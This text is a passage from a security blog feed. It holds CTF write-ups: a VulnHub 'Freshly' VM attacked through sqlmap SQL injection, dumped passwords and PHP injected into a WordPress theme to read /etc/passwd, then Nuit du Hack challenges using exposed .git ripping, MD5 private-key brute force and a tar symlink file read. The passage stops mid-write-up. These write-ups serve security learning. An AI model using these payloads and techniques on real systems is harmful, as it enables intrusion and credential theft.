&lt;p&gt;We run &lt;a href="https://github.com/wpscanteam/wpscan"&gt;&lt;code&gt;wpscan&lt;/code&gt;&lt;/a&gt; on the 8080 website:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/
[+] URL: http://10.0.2.5:8080/wordpress/
[+] Started: Thu Apr 16 20:01:39 2015

[!] The WordPress &amp;#39;http://10.0.2.5:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1.1 identified from meta generator

[+] Enumerating plugins from passive detection ...
 | 4 plugins found:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: contact-form-7 - v4.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt

[+] Name: proplayer - v4.7.9.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: all-in-one-seo-pack - v2.2.5.1
 |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
 |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt

[!] Title: All in One SEO Pack &amp;amp;lt;= 2.2.5.1 - Authentication Bypass
    Reference: https://wpvulndb.com/vulnerabilities/7881
    Reference: http://jvn.jp/en/jp/JVN75615300/index.html
    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902
[i] Fixed in: 2.2.6
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got some nice results, three plug-in have security issues. Digging furtherer,
we notice that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;All in One SEO Pack  - Authentication Bypas: There was nothing in the metadata.&lt;/li&gt;
&lt;li&gt;Cart66 Lite 1.5.3 - SQL Injection: Need to be authenticated&lt;/li&gt;
&lt;li&gt;proplayer 4.7.9.1 - SQL Injection: Concerns a non available URL (you can run sqlmap on it to confirm this)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Therefore none of this will help us in this challenge.&lt;/p&gt;
&lt;h1&gt;Exploit&lt;/h1&gt;
&lt;p&gt;Nikto shows us some interesting URL. The login interface at &lt;code&gt;login.php&lt;/code&gt; may be
injectable.&lt;/p&gt;
&lt;h2&gt;sqlmap&lt;/h2&gt;
&lt;p&gt;We need to use burp in order to save the POST request to a file, an then we
launch &lt;a href="http://sqlmap,org"&gt;sqlmap&lt;/a&gt; on the &lt;code&gt;login.php&lt;/code&gt; URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user
         _
 ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}
|_ -| . | |     | .&amp;#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[*] starting at 20:43:22

[20:43:22] [INFO] parsing HTTP request from &amp;#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&amp;#39;
[20:43:22] [INFO] resuming back-end DBMS &amp;#39;mysql&amp;#39;
[20:43:22] [INFO] testing connection to the target URL
[20:43:22] [INFO] heuristics detected web page charset &amp;#39;ascii&amp;#39;
sqlmap identified the following injection points with a total of 0 HTTP(s)
requests:
---
Parameter: user (POST)
    Type: AND/OR time-based blind
    Title: MySQL &amp;amp;gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: user=asdf&amp;#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &amp;#39;KuPd&amp;#39;=&amp;#39;KuPd&amp;amp;amp;password=asdf&amp;amp;amp;s=Submit
---
[20:43:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.12
[20:43:22] [INFO] fetched data logged to text files under &amp;#39;/home/maggick/.sqlmap/output/10.0.2.5&amp;#39;

[*] shutting down at 20:43:22
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay the &lt;code&gt;user&lt;/code&gt; parameter is vulnerable to a time-based blind injection. Let's
see what are the databases:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs
back-end DBMS: MySQL 5.0.12
[...]
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's dump the interesting databases, &lt;code&gt;users&lt;/code&gt; and &lt;code&gt;login&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;users:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Database: login
Table: users
[2 entries]
+----------+-----------+
| password | user_name |
+----------+-----------+
| password | candyshop |
| PopRocks | Sir       |
+----------+-----------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;login:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we got some passwords. Then let's use the wordpress password.&lt;/p&gt;
&lt;h2&gt;Admin, PHP and Flag&lt;/h2&gt;
&lt;p&gt;We got the admin password for &lt;code&gt;http://10.0.2.5:8080/wordpress/wp-login&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wordpress, admin interface" src="/media/2015.04/wordpress_admin.png"&gt;&lt;/p&gt;
&lt;p&gt;As we want to read a file on the system, let's put some PHP code in the theme:
We go to Appearance -&amp;gt; Editor -&amp;gt; Footer (footer.php) and add some PHP code in
order to execute it, let's get the &lt;code&gt;/etc/passwd&lt;/code&gt; file :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt; &amp;amp;lt;?php&lt;/span&gt;
&lt;span class="x"&gt;$myfile = fopen(&amp;quot;/etc/passwd&amp;quot;, &amp;quot;r&amp;quot;) or die(&amp;quot;Unable to open file!&amp;quot;);&lt;/span&gt;
&lt;span class="x"&gt;echo fread($myfile,filesize(&amp;quot;/etc/passwd&amp;quot;));&lt;/span&gt;
&lt;span class="x"&gt;fclose($myfile);&lt;/span&gt;
&lt;span class="x"&gt;?&amp;amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When we reload the index page we got the &lt;code&gt;/etc/password&lt;/code&gt; file in the footer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = &amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wut? We already got the flag!
No need to root the systemâ¦ sadly.&lt;/p&gt;
&lt;p&gt;As there is not ssh port open, I tried to log on the VM with
&lt;code&gt;root:SuperSecretPassword&lt;/code&gt; and it simply worked.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This was a simple challenge, based on web pentesting.
It was a bit short but nonetheless interesting.&lt;/p&gt;
&lt;p&gt;Road to flag:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL injection on the &lt;code&gt;/login.php&lt;/code&gt; interface&lt;/li&gt;
&lt;li&gt;Get the wordpress admin password&lt;/li&gt;
&lt;li&gt;As wordpress admin inject PHP code in the web site (via the theme)&lt;/li&gt;
&lt;li&gt;Display &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Flag : &lt;strong&gt;"NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"&lt;/strong&gt;&lt;/p&gt;</content><category term="challenge"></category><category term="security"></category><category term="vulnhub"></category></entry><entry><title>CTF NDH Qualifications</title><link href="https://matthieukeller.com/2015/04/ctf-ndh-qualifications.html" rel="alternate"></link><published>2015-04-07T00:00:00+02:00</published><updated>2015-04-07T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-04-07:/2015/04/ctf-ndh-qualifications.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/ndh_logo.png" alt="Logo NDH"
width="202"&gt;&lt;/p&gt;
&lt;p&gt;This weekend (4 April 2015) take place the qualification round for
&lt;a href="https://nuitduhack.com/en/"&gt;"Nuit du Hack" CTF&lt;/a&gt; from 00:01 to 23:59. It was a
Jeopardy CTF.&lt;/p&gt;
&lt;p&gt;I have participated with the &lt;a href="http://www.zenk-security.com/"&gt;Zenk-Security&lt;/a&gt; team.
At the end we got the 7th position and are qualified for the final which would
be a Attack-Defense CTF in Paris in June.&lt;/p&gt;
&lt;p&gt;I publish here the ones for the challenges I participated to and make a writeup
of. All the writeup for this CTF are
&lt;a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals"&gt;accessible here (in french)&lt;/a&gt;.
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/ndh_logo.png" alt="Logo NDH"
width="202"&gt;&lt;/p&gt;
&lt;p&gt;This weekend (4 April 2015) take place the qualification round for
&lt;a href="https://nuitduhack.com/en/"&gt;"Nuit du Hack" CTF&lt;/a&gt; from 00:01 to 23:59. It was a
Jeopardy CTF.&lt;/p&gt;
&lt;p&gt;I have participated with the &lt;a href="http://www.zenk-security.com/"&gt;Zenk-Security&lt;/a&gt; team.
At the end we got the 7th position and are qualified for the final which would
be a Attack-Defense CTF in Paris in June.&lt;/p&gt;
&lt;p&gt;I publish here the ones for the challenges I participated to and make a writeup
of. All the writeup for this CTF are
&lt;a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals"&gt;accessible here (in french)&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;This article is a bit long, so here is the list of the available writeup :&lt;/p&gt;
&lt;h1&gt;Menu:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#facebox"&gt;FaceBox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#facesec"&gt;FaceSec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#secureauth"&gt;SecureAuth&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#updator"&gt;Updator&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#raptor"&gt;Raptor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;FaceBox&lt;/h1&gt;
&lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/10&lt;/p&gt;
&lt;p&gt;http://prod.facebox.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2&gt;Statement&lt;/h2&gt;
&lt;p&gt;*A shady company decided to write their own software for storing files in the
cloud.&lt;/p&gt;
&lt;p&gt;"No no no, this is OUR filebox. We decline any responsability in the usage of our
filebox. In any event your files get lost, trashed, stolen or spy on : it's
your fault, not ours."&lt;/p&gt;
&lt;p&gt;You are investigating on the security of their cloud storage as it might have
disastrous consequences if it were to get hacked by malicious actors.*&lt;/p&gt;
&lt;h2&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The website prod.facebox.challs.nuitduhack.com allow us to create an account and
log ourself. Then we can upload files on the server both in public and private
mod. In this case the link to the file is hide to the other users.&lt;/p&gt;
&lt;h3&gt;File Upload&lt;/h3&gt;
&lt;p&gt;We tried to upload files and execute some code on the server. It was a
waste of time. Then we think that if there was a prod, there should also be a
dev.&lt;/p&gt;
&lt;h3&gt;dev&lt;/h3&gt;
&lt;p&gt;With http://dev.facebox.challs.nuitduhack.com/ we found a git project with the
following tree:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://dev.facebox.challs.nuitduhack.com/.git/config
http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG
http://dev.facebox.challs.nuitduhack.com/.git/HEAD
http://dev.facebox.challs.nuitduhack.com/.git/refs/heads/master
http://dev.facebox.challs.nuitduhack.com/.git/logs/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The page http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG show the
last commit messages: &lt;em&gt;hash generation function&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We can easily retrieve all files on this repository with &lt;code&gt;rip-git.pl&lt;/code&gt;:
https://github.com/ctfs/write-ups-2014/tree/master/9447-ctf-2014/tumorous
https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-git.pl&lt;/p&gt;
&lt;h3&gt;A bit of python&lt;/h3&gt;
&lt;p&gt;With &lt;code&gt;rip-git.pl&lt;/code&gt; we found the python script that generate the link of the
uploaded files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;dbuser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;dbuser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dbuser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;99999999&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;upd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;upd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;privkey&lt;/span&gt;
        &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Private file&lt;/h3&gt;
&lt;p&gt;We have been asked to test the application security. The private file access
seems a interesting vulnerability. The first two files were probably upload by
the staff.
Then we will try to get the &lt;strong&gt;confidentials.txt&lt;/strong&gt; file upload by the user koffi.
Hopfuly a second file was upload by this user: &lt;strong&gt;paste1.txt&lt;/strong&gt; at the address
http://prod.facebox.challs.nuitduhack.com/files/view/3686d78a6e9d5258773a6ae0469d3ed4&lt;/p&gt;
&lt;p&gt;In order to find the private key of the koffi user, we quickly inverse the
previous script and we brute force the private key in order to found the good
link with the url of the &lt;strong&gt;paste1.txt&lt;/strong&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000000&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;paste01.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3686d78a6e9d5258773a6ae0469d3ed4&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;privkey found: &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Done!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Result: &lt;strong&gt;privkey found: 95594864&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;With this private key we applied the algorithm to the &lt;strong&gt;crendentials.txt&lt;/strong&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;95594864&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;koffi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;confidentials.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Result: &lt;strong&gt;35e2cb0b2e8bd40347ecd4e32767a060&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We have the complete url to access the private file:
http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: M4x_M4i5_DR&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;FaceSec&lt;/h1&gt;
&lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/11&lt;/p&gt;
&lt;p&gt;http://facesec.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2&gt;Statement&lt;/h2&gt;
&lt;p&gt;*"Hello there,&lt;/p&gt;
&lt;p&gt;We are looking for a developer or security consultant to secure our filebox
system. We stumbled upon your LinkedIn profile and it seems like you would be a
perfect candidate for this job. Could you please send us your CV and Motivation
letter?&lt;/p&gt;
&lt;p&gt;Thanks,&lt;/p&gt;
&lt;p&gt;faceSec HR Director."*&lt;/p&gt;
&lt;h2&gt;Challenge&lt;/h2&gt;
&lt;p&gt;This challenge allow us to register an account and then upload text file as
resume and motivation letter in order to apply for a job.
We can also upload a compressed file (tar) with a cv.txt and a motiv.txt in
order to upload both files at the same time.&lt;/p&gt;
&lt;h3&gt;Facebook&lt;/h3&gt;
&lt;p&gt;This challenge looks like the Facebook vulnerability discover last December:
http://josipfranjkovic.blogspot.fr/2014/12/reading-local-files-from-facebooks.html
nevertheless we must upload a .tar file instead of a .zip file.&lt;/p&gt;
&lt;h3&gt;A bit of symbolic link&lt;/h3&gt;
&lt;p&gt;We create a &lt;code&gt;cv.txt&lt;/code&gt; file with a symbolic link to &lt;code&gt;/etc/passwd&lt;/code&gt; and a
&lt;code&gt;motiv.txt&lt;/code&gt; file with random content and then tar the two files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -s /etc/passwd cv.txt
echo plop &amp;amp;gt; motiv.txt
tar cvf tar.tar *.txt
    cv.txt
    motiv.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We upload the file &lt;code&gt;tar.tar&lt;/code&gt; and we get as excepted the &lt;code&gt;/etc/passwd&lt;/code&gt; file from
the server:&lt;/p&gt;
